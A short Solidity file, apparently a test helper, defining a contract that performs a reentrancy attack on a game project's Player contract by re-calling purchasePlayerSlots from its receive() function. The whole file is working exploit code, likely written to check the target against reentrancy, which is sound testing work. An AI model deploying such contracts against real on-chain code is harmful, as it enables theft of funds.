// SPDX-License-Identifier: GPL-3.0-or-later
pragma solidity ^0.8.13;

import {Player} from "../../src/fighters/Player.sol";

contract ReentrancyAttacker {
    Player public target;
    uint256 public attackCount;
    bool public attacking;

    constructor(Player _target) {
        target = _target;
    }

    receive() external payable {
        if (attacking && attackCount < 2) {
            attackCount++;
            target.purchasePlayerSlots{value: msg.value}();
        }
    }

    function attack() external payable {
        attacking = true;
        attackCount = 0;
        target.purchasePlayerSlots{value: msg.value}();
        attacking = false;
    }
}
